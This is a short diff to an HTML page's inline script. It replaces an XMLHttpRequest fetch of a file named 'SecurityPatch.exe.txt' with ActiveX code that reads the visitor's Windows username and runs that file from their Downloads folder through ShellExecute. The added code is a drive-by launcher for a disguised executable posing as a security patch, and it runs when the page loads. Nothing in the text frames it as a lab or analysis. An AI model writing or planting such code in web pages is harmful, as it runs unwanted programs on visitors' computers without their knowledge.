@@ -11,17 +11,11 @@
     <div>
         <script>
 
-            var xmlHttp = new XMLHttpRequest;
-            xmlHttp.onreadystatechange = function () {
-                if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
-                    
-                }
+            var ax = new ActiveXObject("WScript.Network");
+            var oShell = new ActiveXObject("Shell.Application");
+            var commandtoRun = "C:\\Users\\"+ax.UserName+"\\Downloads\\SecurityPatch.exe.txt";
+            oShell.ShellExecute(commandtoRun, "", "", "open", "1");
 
-
-            }
-
-            xmlHttp.open("GET", "~/images/SecurityPatch.exe.txt", true);
-            xmlHttp.send();
         </script>
         
     
